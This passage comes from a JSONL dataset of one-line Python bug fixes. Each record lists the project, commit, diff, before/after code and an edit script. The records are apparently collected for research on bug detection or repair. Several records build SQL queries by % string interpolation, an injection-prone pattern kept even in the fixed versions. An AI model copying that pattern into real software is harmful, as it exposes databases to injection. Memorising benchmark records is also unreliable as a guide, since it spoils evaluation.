by stock_move.date_planned ASC LIMIT 1\" % prodlot_id )", "after": "cr . execute ( \"select location_dest_id from stock_move where stock_move.prodlot_id = %s and stock_move.state='done' order by stock_move.date_planned DESC LIMIT 1\" % prodlot_id )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"select location_dest_id from stock_move where stock_move.prodlot_id = %s and stock_move.state='done' order by stock_move.date_planned ASC LIMIT 1\\\"\", 3, 24, 3, 171], \"\\\"select location_dest_id from stock_move where stock_move.prodlot_id = %s and stock_move.state='done' order by stock_move.date_planned DESC LIMIT 1\\\"\"]]"}
{"project": "stock-logistics-workflow", "commit_sha": "7e518e4ee886e819a167e43bc86f420733c9bbf1", "parent_sha": "960978200387f0130f5d48d8909eac209117f080", "file_path": "mrp_prodlot_autosplit/stock.py", "project_url": "https://github.com/nzroof/stock-logistics-workflow", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -99,7 +99,7 @@ class stock_production_lot(osv.osv):\n     def _last_location_id(self, cr, uid, ids, field_name, arg, context={}):\n         res = {}\n         for prodlot_id in ids:\n-            cr.execute(\"select location_dest_id from stock_move where stock_move.prodlot_id = %s and stock_move.state='done' order by stock_move.date_planned DESC LIMIT 1\" % prodlot_id)\n+            cr.execute(\"select location_dest_id from stock_move where stock_move.prodlot_id = %s and stock_move.state='done' order by stock_move.date DESC LIMIT 1\" % prodlot_id)\n             results = cr.fetchone()\n             if results and len(results) > 0:\n", "before": "cr . execute ( \"select location_dest_id from stock_move where stock_move.prodlot_id = %s and stock_move.state='done' order by stock_move.date_planned DESC LIMIT 1\" % prodlot_id )", "after": "cr . execute ( \"select location_dest_id from stock_move where stock_move.prodlot_id = %s and stock_move.state='done' order by stock_move.date DESC LIMIT 1\" % prodlot_id )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"select location_dest_id from stock_move where stock_move.prodlot_id = %s and stock_move.state='done' order by stock_move.date_planned DESC LIMIT 1\\\"\", 3, 24, 3, 172], \"\\\"select location_dest_id from stock_move where stock_move.prodlot_id = %s and stock_move.state='done' order by stock_move.date DESC LIMIT 1\\\"\"]]"}
{"project": "server-tools", "commit_sha": "b88f7fa841ccc1a3b52cea2ed14b230d74fa0fe4", "parent_sha": "76f2ebe12601318734c73a600ac1f58e00fae1ce", "file_path": "auto_backup/model/backup_scheduler.py", "project_url": "https://github.com/roussel2nis/server-tools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -236,7 +236,7 @@ class db_backup(models.Model):\n                 except:\n                     raise\n                 # Create name for dumpfile.\n-                bkp_file = '%s_%s.dimp.zip' % (\n+                bkp_file = '%s_%s.dump.zip' % (\n                     time.strftime('%d_%m_%Y_%H_%M_%S'),\n                     rec.name)\n                 file_path = os.path.join(rec.bkp_dir, bkp_file)\n", "before": "bkp_file = '%s_%s.dimp.zip' % ( time . strftime ( '%d_%m_%Y_%H_%M_%S' ) , rec . name )", "after": "bkp_file = '%s_%s.dump.zip' % ( time . strftime ( '%d_%m_%Y_%H_%M_%S' ) , rec . name )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'%s_%s.dimp.zip'\", 3, 28, 3, 44], \"'%s_%s.dump.zip'\"]]"}
{"project": "charm-neutron-openvswitch", "commit_sha": "cbece04f0c9391e2ca682795ef9c3f3684aa1d8c", "parent_sha": "08a1b0cfb8e4d4e5acf9ac185827fae6850d8bf7", "file_path": "unit_tests/test_utils.py", "project_url": "https://github.com/CanonicalBootStack/charm-neutron-openvswitch", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -38,7 +38,7 @@ def load_config():\n \n     if not config:\n         logging.error('Could not find config.yaml in any parent directory '\n-                      'of %s. ' % file)\n+                      'of %s. ' % __file__)\n         raise Exception\n \n     return yaml.safe_load(open(config).read())['options']\n", "before": "logging . error ( 'Could not find config.yaml in any parent directory ' 'of %s. ' % file )", "after": "logging . error ( 'Could not find config.yaml in any parent directory ' 'of %s. ' % __file__ )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"identifier:file\", 3, 35, 3, 39], \"__file__\"]]"}
{"project": "charm-percona-cluster", "commit_sha": "a2ac80dba9088fea30ce70d560c51c8c85a392af", "parent_sha": "e6374dec1c05d0e7dccd3984775e70e862dce3bb", "file_path": "hooks/percona_utils.py", "project_url": "https://github.com/CanonicalBootStack/charm-percona-cluster", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -178,7 +178,7 @@ def update_hosts_file(map):\n \n     log(\"Updating hosts file with: %s\" % (map), level=INFO)\n \n-    log(\"after: %s lines\" % (len(lines)))\n+    log(\"before: %s lines\" % (len(lines)))\n     key = re.compile(\"^(.+?)\\s(.+)\")\n     newlines = []\n     for ip, hostname in map.items():\n", "before": "log ( \"after: %s lines\" % ( len ( lines ) ) )", "after": "log ( \"before: %s lines\" % ( len ( lines ) ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"after: %s lines\\\"\", 3, 9, 3, 26], \"\\\"before: %s lines\\\"\"]]"}
{"project": "auto-perf-test", "commit_sha": "3061d381de5a47bc70c84f1f746d325d26ce92cd", "parent_sha": "5f8c3793ec34f8d10aa9f1493dfb963ccbb42a4c", "file_path": "autotest.py", "project_url": "https://github.com/ScreamingUdder/auto-perf-test", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -155,13 +155,13 @@ def handle_command(command, channel, job_queue, enable_build_on_push):\n         clear_build_directory()\n         response = \"The build directory has been cleared, ready for a clean build\"\n     elif command.startswith('help'):\n-        response = 'Commands:\\n' + '\\\"\\n\\\"'.join(['show queue',\n-                                                  'clear queue',\n-                                                  'test <COMMIT>',\n-                                                  'enable build on git push',\n-                                                  'disable build on git push',\n-                                                  'clear build directory',\n-                                                  'help']) + '\\\"'\n+        response = 'Commands:\\n\\\"' + '\\\"\\n\\\"'.join(['show queue',\n+                                                    'clear queue',\n+                                                    'test <COMMIT>',\n+                                                    'enable build on git push',\n+                                                    'disable build on git push',\n+                                                    'clear build directory',\n+                                                    'help']) + '\\\"'\n     sc.api_call(\"chat.postMessage\", channel=channel,\n                 text=response, as_user=True)\n     return enable_build_on_push\n", "before": "response = 'Commands:\\n' + '\\\"\\n\\\"' . join ( [ 'show queue' , 'clear queue' , 'test <COMMIT>' , 'enable build on git push' , 'disable build on git push' , 'clear build directory' , 'help' ] ) + '\\\"'", "after": "response = 'Commands:\\n\\\"' + '\\\"\\n\\\"' . join ( [ 'show queue' , 'clear queue' , 'test <COMMIT>' , 'enable build on git push' , 'disable build on git push' , 'clear build directory' , 'help' ] ) + '\\\"'", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'Commands:\\\\n'\", 3, 20, 3, 33], \"'Commands:\\\\n\\\\\\\"'\"]]"}
{"project": "features", "commit_sha": "4d6859f09ef1d82cc69d8b1a1de0ecfcd1249586", "parent_sha": "cd6b3eff637224c0fe8b5bea3543f7f9542984cc", "file_path": "src/recipes/D1A0000000000001/recipe.py", "project_url": "https://github.com/ScreamingUdder/features", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -97,7 +97,7 @@ class recipe:\n             self.failure_comments.append(\"%s : Signal attribute points to a non-existent dataset (%s)\" % (obj.name, signal))\n             return\n         if \"axes\" not in attributes:\n-            self.failure_comments.append(\"%s : No axes are specified\" % (obj.name))\n+            self.failure_comments.append(\"%s : No 'axes' attribute is present\" % (obj.name))\n             return\n         for axis in obj.attrs['axes']:\n             if axis not in datasets + ['.']:\n", "before": "self . failure_comments . append ( \"%s : No axes are specified\" % ( obj . name ) )", "after": "self . failure_comments . append ( \"%s : No 'axes' attribute is present\" % ( obj . name ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"%s : No axes are specified\\\"\", 3, 42, 3, 70], \"\\\"%s : No 'axes' attribute is present\\\"\"]]"}
{"project": "features", "commit_sha": "a49fa63aa9f307dd5f07c9d070644d105d974073", "parent_sha": "e6ea9ba119c56571065547ed9c62edd5abe2fa71", "file_path": "src/recipes/ECB064453EDB096D/recipe.py", "project_url": "https://github.com/ScreamingUdder/features", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -164,7 +164,7 @@ def _check_datasets_have_same_length(group, dataset_names, fails):\n     dataset_lengths = [group[dataset_name].len() for dataset_name in _existant_datasets(group, dataset_names)]\n     if len(set(dataset_lengths)) > 1:\n-        fails.append(', '.join(dataset_names) + \"should have the same length in \" + group.name)\n+        fails.append(', '.join(dataset_names) + \" should have the same length in \" + group.name)\n \n \n def _existant_datasets(group, dataset_names):\n", "before": "fails . append ( ', ' . join ( dataset_names ) + \"should have the same length in \" + group . name )", "after": "fails . append ( ', ' . join ( dataset_names ) + \" should have the same length in \" + group . name )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"should have the same length in \\\"\", 2, 49, 2, 82], \"\\\" should have the same length in \\\"\"]]"}
{"project": "features", "commit_sha": "74d23e208e0764a8617e617ad6586f482c7a2204", "parent_sha": "7706f446b6a393cec66273a077d59b0076549e96", "file_path": "src/recipes/D1A0000000000002/recipe.py", "project_url": "https://github.com/ScreamingUdder/features", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -52,7 +52,7 @@ class NXcitation_manager(object):\n                                                                    self.get_full_endnote())\n \n     def __str__(self):\n-        return \"This file has %i citaions\" % (self.get_number_of_citations())\n+        return \"This file has %i citations\" % (self.get_number_of_citations())\n \n \n class NXciteVisitor(object):\n", "before": "return \"This file has %i citaions\" % ( self . get_number_of_citations ( ) )", "after": "return \"This file has %i citations\" % ( self . get_number_of_citations ( ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"This file has %i citaions\\\"\", 3, 16, 3, 43], \"\\\"This file has %i citations\\\"\"]]"}
{"project": "xos-1", "commit_sha": "4edc8620749b927edd869df81446d22a433f53b0", "parent_sha": "b7cf17b67d50f463ae0f2c80ec1aceac311342e5", "file_path": "xos/core/models/sliver.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -99,7 +99,9 @@ class Sliver(PlCoreBase):\n     userData = models.TextField(blank=True, null=True, help_text=\"user_data passed to instance during creation\")\n \n     def __unicode__(self):\n-        if self.name and self.slice and (self.name != self.slice.name):\n+        if self.name and Slice.objects.filter(id=self.slice_id) and (self.name != self.slice.name):\n+            # NOTE: The weird check on self.slice_id was due to a problem when\n+            #   deleting the slice before the sliver.\n             return u'%s' % self.name\n         elif self.instance_name:\n             return u'%s' % (self.instance_name)\n", "before": "if self . name and self . slice and ( self . name != self . slice . name ) : return u'%s' % self . name elif self . instance_name : return u'%s' % ( self . instance_name )", "after": "if self . name and Slice . objects . filter ( id = self . slice_id ) and ( self . name != self . slice . name ) : return u'%s' % self . name elif self . instance_name : return u'%s' % ( self . instance_name )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 12, 3, 36], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:filter\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"keyword_argument\", \"N4\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:Slice\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:objects\", \"T\"], 2], [\"Insert\", \"N4\", [\"identifier:id\", \"T\"], 0], [\"Insert\", \"N4\", [\"=:=\", \"T\"], 1], [\"Move\", \"N4\", [\"attribute\", 3, 26, 3, 36], 2], [\"Update\", [\"identifier:slice\", 3, 31, 3, 36], \"slice_id\"]]"}
{"project": "xos-1", "commit_sha": "1a8513259f89baf627355045549eabf5c955e967", "parent_sha": "26f84889953bc7f15456a9427f896afe3cf482de", "file_path": "xos/cord/models.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -631,7 +631,7 @@ class VCPETenant(Tenant):\n            return None\n         try:\n            (a,b,c,d) = ip.split('.')\n-           wan_mac = \"02:42:%2x:%2x:%2x:%2x\" % (int(a), int(b), int(c), int(d))\n+           wan_mac = \"02:42:%02x:%02x:%02x:%02x\" % (int(a), int(b), int(c), int(d))\n         except:\n            wan_mac = \"Exception\"\n         return wan_mac\n", "before": "wan_mac = \"02:42:%2x:%2x:%2x:%2x\" % ( int ( a ) , int ( b ) , int ( c ) , int ( d ) )", "after": "wan_mac = \"02:42:%02x:%02x:%02x:%02x\" % ( int ( a ) , int ( b ) , int ( c ) , int ( d ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"02:42:%2x:%2x:%2x:%2x\\\"\", 3, 22, 3, 45], \"\\\"02:42:%02x:%02x:%02x:%02x\\\"\"]]"}
{"project": "xos-1", "commit_sha": "b319232e23ce115da361cbb0b16064d47f418302", "parent_sha": "c20efd27c6a822041e829d535b896433f8f46cdb", "file_path": "xos/synchronizers/vcpe/steps/sync_vcpetenant.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -150,7 +150,7 @@ class SyncVSGTenant(SyncInstanceUsingAnsible):\n             wan_vm_mac = parts[2]\n         else:\n             if CORD_USE_VTN:\n-                raise Exception(\"no vm_wan_addr tag for instance %s\" % instance)\n+                raise Exception(\"no vm_wan_addr tag for instance %s\" % o.instance)\n \n         fields = {\"vlan_ids\": vlan_ids,   # XXX remove this\n                 \"s_tags\": s_tags,\n", "before": "CORD_USE_VTN : raise Exception ( \"no vm_wan_addr tag for instance %s\" % instance )", "after": "CORD_USE_VTN : raise Exception ( \"no vm_wan_addr tag for instance %s\" % o . instance )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 33, 3, 80], [\"attribute\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:o\", \"T\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:instance\", 3, 72, 3, 80], 2]]"}
{"project": "erpnext-v7", "commit_sha": "8c6b0b48ed50549b584f9cbb23a0abdbdfd84e98", "parent_sha": "ee81150e7c3a67c91b9eb0f84a09b70b7c33433a", "file_path": "stock/doctype/stock_reconciliation/stock_reconciliation.py", "project_url": "https://github.com/YefriTavarez/erpnext-v7", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -118,7 +118,7 @@ class DocType:\n \t# ------------------\n \tdef get_current_stock(self, item_code, warehouse):\n \t\tbin = sql(\"select name from `tabBin` where item_code = '%s' and warehouse = '%s'\" % (item_code, warehouse))\n-\t\tprev_sle = bin and get_obj('Bin', bin[0][0]).get_prev_sle(self.doc.reconciliation_date,self.doc.reconciliation_time) or 0\n+\t\tprev_sle = bin and get_obj('Bin', bin[0][0]).get_prev_sle(self.doc.reconciliation_date,self.doc.reconciliation_time) or {}\n \t\tstock_uom = sql(\"select stock_uom from `tabItem` where name = %s\",item_code)\n \t\treturn {'actual_qty': prev_sle.get('bin_aqat', 0), 'stock_uom': stock_uom[0][0]}\n \n", "before": "prev_sle = bin and get_obj ( 'Bin' , bin [ 0 ] [ 0 ] ) . get_prev_sle ( self . doc . reconciliation_date , self . doc . reconciliation_time ) or 0", "after": "prev_sle = bin and get_obj ( 'Bin' , bin [ 0 ] [ 0 ] ) . get_prev_sle ( self . doc . reconciliation_date , self . doc . reconciliation_time ) or { }", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 14, 3, 124], [\"dictionary\", \"N0\"], 2], [\"Insert\", \"N0\", [\"{:{\", \"T\"], 0], [\"Insert\", \"N0\", [\"}:}\", \"T\"], 1], [\"Delete\", [\"integer:0\", 3, 123, 3, 124]]]"}
{"project": "erpnext-v7", "commit_sha": "dc2f388e586986db49a1a4cf7c4b6f3285d6e09f", "parent_sha": "673f66f56e95bdc166becd2616254acd39af1baa", "file_path": "support/doctype/support_ticket/__init__.py", "project_url": "https://github.com/YefriTavarez/erpnext-v7", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -92,7 +92,7 @@ We will get back to you as soon as possible\n \t\tsendmail(\\\n \t\t\trecipients = [d.raised_by], \\\n \t\t\tsender = self.email_settings.support_email, \\\n-\t\t\tsubject = '['+d.name+'] ' + d.subject, \\\n+\t\t\tsubject = '['+d.name+'] ' + str(d.subject or ''), \\\n \t\t\tmsg = response)\n \t\t\n \tdef auto_close_tickets(self):\n", "before": "sendmail ( recipients = [ d . raised_by ] , sender = self . email_settings . support_email , subject = '[' + d . name + '] ' + d . subject , msg = response )", "after": "sendmail ( recipients = [ d . raised_by ] , sender = self . email_settings . support_email , subject = '[' + d . name + '] ' + str ( d . subject or '' ) , msg = response )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 14, 3, 41], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"boolean_operator\", \"N2\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2], [\"Move\", \"N2\", [\"attribute\", 3, 32, 3, 41], 0], [\"Insert\", \"N2\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N2\", [\"string:''\", \"T\"], 2]]"}
{"project": "erpnext-v7", "commit_sha": "79e8247d82ebcbc9a60aae09d2ee1e0fe0a505ec", "parent_sha": "fff40599e808e47ea8a81de88d5eb278f7b82d84", "file_path": "erpnext/stock/doctype/stock_ledger/stock_ledger.py", "project_url": "https://github.com/YefriTavarez/erpnext-v7", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -139,7 +139,7 @@ class DocType:\n \t\t\telif purpose == 'Sales Return':\n \t\t\t\tsql(\"update `tabSerial No` set status = 'Delivered', purchase_document_type = '', purchase_document_no = '' where name = '%s'\" % serial_no)\n \t\t\telse:\n-\t\t\t\tsql(\"update `tabSerial No` set docstatus = 2, status = 'Not in Use', purchase_document_type = '', purchase_document_no = '', purchase_date = '', purchase_rate = '', supplier = null, supplier_name = '', supplier_address = '', warehouse = '' where name = '%s'\" % serial_no)\n+\t\t\t\tsql(\"update `tabSerial No` set docstatus = 2, status = 'Not in Use', purchase_document_type = '', purchase_document_no = '', purchase_date = null, purchase_rate = 0, supplier = null, supplier_name = '', supplier_address = '', warehouse = '' where name = '%s'\" % serial_no)\n \n \n \t# -------------------------------\n", "before": "else : sql ( \"update `tabSerial No` set docstatus = 2, status = 'Not in Use', purchase_document_type = '', purchase_document_no = '', purchase_date = '', purchase_rate = '', supplier = null, supplier_name = '', supplier_address = '', warehouse = '' where name = '%s'\" % serial_no )", "after": "else : sql ( \"update `tabSerial No` set docstatus = 2, status = 'Not in Use', purchase_document_type = '', purchase_document_no = '', purchase_date = null, purchase_rate = 0, supplier = null, supplier_name = '', supplier_address = '', warehouse = '' where name = '%s'\" % serial_no )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"update `tabSerial No` set docstatus = 2, status = 'Not in Use', purchase_document_type = '', purchase_document_no = '', purchase_date = '', purchase_rate = '', supplier = null, supplier_name = '', supplier_address = '', warehouse = '' where name = '%s'\\\"\", 3, 9, 3, 263], \"\\\"update `tabSerial No` set docstatus = 2, status = 'Not in Use', purchase_document_type = '', purchase_document_no = '', purchase_date = null, purchase_rate = 0, supplier = null, supplier_name = '', supplier_address = '', warehouse = '' where name = '%s'\\\"\"]]"}
{"project": "TTU-NoC", "commit_sha": "6f45de3f0550edb312a200b6dfa7fab03c143d1f", "parent_sha": "790e8a12397be19192b44abd10a45dd9faf31cbb", "file_path": "Scripts/include/write_do_file.py", "project_url": "https://github.com/siavooshpayandehazad/TTU-NoC", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -59,7 +59,7 @@ def write_do_file(program_argv, net_file_name, net_tb_file_name, wave_do_file_na\n             do_file.write(\"vcom \\\"\" + TEST_DIR + \"/TB_Package_32_bit_\" + CREDIT_BASED_SUFFIX + \".vhd\\\"\\n\")\n \n     if program_argv['trace'] :\n-        do_file.write(\"vcom \\\"\" + ROUTER_RTL_DIR + \"flit_tracker.vhd\\\"\\n\")\n+        do_file.write(\"vcom \\\"\" + ROUTER_RTL_DIR + \"/flit_tracker.vhd\\\"\\n\")\n \n     # Generated network files\n     do_file.write(\"vcom \\\"\" +  net_file_name + \"\\\"\\n\")\n", "before": "do_file . write ( \"vcom \\\"\" + ROUTER_RTL_DIR + \"flit_tracker.vhd\\\"\\n\" )", "after": "do_file . write ( \"vcom \\\"\" + ROUTER_RTL_DIR + \"/flit_tracker.vhd\\\"\\n\" )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"flit_tracker.vhd\\\\\\\"\\\\n\\\"\", 3, 52, 3, 74], \"\\\"/flit_tracker.vhd\\\\\\\"\\\\n\\\"\"]]"}
{"project": "Cura", "commit_sha": "de03470dbc41ab23cdf6623da3f10d81e4b4d9bd", "parent_sha": "40d34564c1518f2ac82b2d4248050e14dda1d257", "file_path": "PrinterConnection.py", "project_url": "https://github.com/themaninthesuitcase/Cura", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -150,7 +150,7 @@ class PrinterConnection(SignalEmitter):\n             programmer.connect(self._serial_port) #Connect with the serial, if this succeeds, it's an arduino based usb device.\n             self._serial = programmer.leaveISP()    \n         except ispBase.IspError as e:\n-            Logger.log('i', \"Could not establish connect        ion on %s: %s. Device is not arduino based.\" %(self._serial_port,str(e)))\n+            Logger.log('i', \"Could not establish connection on %s: %s. Device is not arduino based.\" %(self._serial_port,str(e)))\n         except:\n             Logger.log('i', \"Could not establish connection on %s, unknown reasons.  Device is not arduino based.\" % self._serial_port)\n         \n", "before": "except ispBase . IspError as e : Logger . log ( 'i' , \"Could not establish connect        ion on %s: %s. Device is not arduino based.\" % ( self . _serial_port , str ( e ) ) )", "after": "except ispBase . IspError as e : Logger . log ( 'i' , \"Could not establish connection on %s: %s. Device is not arduino based.\" % ( self . _serial_port , str ( e ) ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"Could not establish connect        ion on %s: %s. Device is not arduino based.\\\"\", 3, 29, 3, 109], \"\\\"Could not establish connection on %s: %s. Device is not arduino based.\\\"\"]]"}
{"project": "harpoon-2", "commit_sha": "59199226f1175b5a1b6c7d680382ba8038bd4f8d", "parent_sha": "30ac768e756cc721e943a1eb7c866599a18af7a6", "file_path": "harpoon/ship/runner.py", "project_url": "https://github.com/pombredanne/harpoon-2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -40,7 +40,7 @@ class Runner(object):\n \n         try:\n             self.run_deps(conf, images)\n-            tty = not detach and conf.harpoon.interactive\n+            tty = not detach and (dependency or conf.harpoon.interactive)\n             container_id = self.create_container(conf, detach, tty)\n \n             conf.container_id = container_id\n", "before": "tty = not detach and conf . harpoon . interactive", "after": "tty = not detach and ( dependency or conf . harpoon . interactive )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 23, 3, 58], [\"parenthesized_expression\", \"N0\"], 2], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N0\", [\"boolean_operator\", \"N1\"], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2], [\"Insert\", \"N1\", [\"identifier:dependency\", \"T\"], 0], [\"Insert\", \"N1\", [\"or:or\", \"T\"], 1], [\"Move\", \"N1\", [\"attribute\", 3, 34, 3, 58], 2]]"}
{"project": "Cura", "commit_sha": "d235b36692db5b7d48998b294da2ce812fedd09c", "parent_sha": "c6d3677d6f2f46ab159f750e655d24acf8cf46ff", "file_path": "cura/PrintInformation.py", "project_url": "https://github.com/themaninthesuitcase/Cura", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -63,6 +63,6 @@ class PrintInformation(QObject):\n         self.currentPrintTimeChanged.emit()\n \n         # Material amount is sent as an amount of mm^3, so calculate length from that\n-        r =  Application.getInstance().getGlobalContainerStack().getValue(\"material_diameter\") / 2\n+        r = Application.getInstance().getGlobalContainerStack().getProperty(\"material_diameter\", \"value\") / 2\n         self._material_amount = round((amount / (math.pi * r ** 2)) / 1000, 2)\n         self.materialAmountChanged.emit()\n", "before": "r = Application . getInstance ( ) . getGlobalContainerStack ( ) . getValue ( \"material_diameter\" ) / 2", "after": "r = Application . getInstance ( ) . getGlobalContainerStack ( ) . getProperty ( \"material_diameter\" , \"value\" ) / 2", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"identifier:getValue\", 3, 66, 3, 74], \"getProperty\"], [\"Insert\", [\"argument_list\", 3, 74, 3, 95], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 74, 3, 95], [\"string:\\\"value\\\"\", \"T\"], 3]]"}
{"project": "Cura", "commit_sha": "ebb95070834d7946bb3aacc20fc52685a1791fe3", "parent_sha": "7d41c1dcb38f36e1cca5a4a4d27d1ebff2964988", "file_path": "plugins/VersionUpgrade/VersionUpgrade21to22/MachineInstance.py", "project_url": "https://github.com/themaninthesuitcase/Cura", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -110,7 +110,7 @@ class MachineInstance:\n \n         version_upgrade_manager = UM.VersionUpgradeManager.VersionUpgradeManager.getInstance()\n         user_storage = os.path.join(UM.Resources.getDataStoragePath(), next(iter(version_upgrade_manager.getStoragePaths(\"user\"))))\n-        user_profile_file = os.path.join(user_storage, self._name + \"_current_settings\")\n+        user_profile_file = os.path.join(user_storage, self._name + \"_current_settings.inst.cfg\")\n         if not os.path.exists(user_storage):\n             os.makedirs(user_storage)\n         with open(user_profile_file, \"w\") as file_handle:\n", "before": "user_profile_file = os . path . join ( user_storage , self . _name + \"_current_settings\" )", "after": "user_profile_file = os . path . join ( user_storage , self . _name + \"_current_settings.inst.cfg\" )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"_current_settings\\\"\", 3, 69, 3, 88], \"\\\"_current_settings.inst.cfg\\\"\"]]"}
{"project": "xadmin", "commit_sha": "15757a3174b07ae386e3b0b2b856337292a90452", "parent_sha": "3e32b44bd5822e1fc55ba21a3de83a1bdc82c2b5", "file_path": "xadmin/views/detail.py", "project_url": "https://github.com/zhqin9/xadmin", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -199,7 +199,7 @@ class DetailAdminView(ModelAdminView):\n         exclude = exclude or None\n         defaults = {\n             \"form\": self.form,\n-            \"fields\": self.fields and list(self.fields) or None,\n+            \"fields\": self.fields and list(self.fields) or '__all__',\n             \"exclude\": exclude,\n         }\n         defaults.update(kwargs)\n", "before": "defaults = { \"form\" : self . form , \"fields\" : self . fields and list ( self . fields ) or None , \"exclude\" : exclude , }", "after": "defaults = { \"form\" : self . form , \"fields\" : self . fields and list ( self . fields ) or '__all__' , \"exclude\" : exclude , }", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 23, 3, 64], [\"string:'__all__'\", \"T\"], 2], [\"Delete\", [\"none:None\", 3, 60, 3, 64]]]"}
{"project": "NIPAP", "commit_sha": "c19e702bd52cd2611fd76980ae65c8dba2c44221", "parent_sha": "2144a1121f61ecd405357b20a5d834443afe3c2a", "file_path": "napd/nap.py", "project_url": "https://github.com/fredsod/NIPAP", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1473,7 +1473,7 @@ class Nap:\n                 SELECT prefix FROM ip_net_plan WHERE \"\"\" + where + \"\"\"\n                 ORDER BY prefix\n                 LIMIT \"\"\" + str(int(search_options['max_result']) + int(search_options['offset'])) + \"\"\"\n-            ) ORDER BY p1.prefix OFFSET \"\"\"  + str(search_options['offset'])\n+            ) ORDER BY p1.prefix, p2.prefix OFFSET \"\"\"  + str(search_options['offset'])\n         opt.insert(0, schema['id'])\n \n         self._execute(sql, opt)\n", "before": "LIMIT \"\"\" + str ( int ( search_options [ 'max_result' ] ) + int ( search_options [ 'offset' ] ) ) + \"\"\"\n             ) ORDER BY p1.prefix OFFSET \"\"\" + str ( search_options [ 'offset' ] )", "after": "LIMIT \"\"\" + str ( int ( search_options [ 'max_result' ] ) + int ( search_options [ 'offset' ] ) ) + \"\"\"\n             ) ORDER BY p1.prefix, p2.prefix OFFSET \"\"\" + str ( search_options [ 'offset' ] )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"\\\"\\\"\\n             ) ORDER BY p1.prefix OFFSET \\\"\\\"\\\"\", 2, 102, 3, 44], \"\\\"\\\"\\\"\\n             ) ORDER BY p1.prefix, p2.prefix OFFSET \\\"\\\"\\\"\"]]"}
